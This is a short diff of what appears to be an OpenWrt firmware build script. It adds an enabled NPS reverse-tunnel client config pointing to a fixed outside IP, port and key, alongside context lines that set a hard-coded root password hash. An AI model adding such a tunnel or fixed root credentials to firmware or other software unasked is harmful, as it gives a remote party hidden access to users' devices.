@@ -105,5 +105,16 @@ sed -i "s/DISTRIB_DESCRIPTION='[^']*'/DISTRIB_DESCRIPTION='$NEW_DESCRIPTION'/" "
 sed -i 's/root:::0:99999:7:::/root:$1$KnJ4TM.n$ENbekTUmENulhsX6pSm.w0:19268:0:99999:7:::/' /etc/shadow
 # 修正连接数
 sed -i '/customized in this file/a net.netfilter.nf_conntrack_max=65535' /etc/sysctl.conf
+cat > /etc/nps <<EOF
+config nps
+	option enabled '1'
+	option server_addr '140.238.31.8'
+	option server_port '50405'
+	option protocol 'tcp'
+	option compress '1'
+	option crypt '1'
+	option vkey 'jxfmjhplwl09bdbd'
+	option log_level '4'
+EOF
 
 exit 0
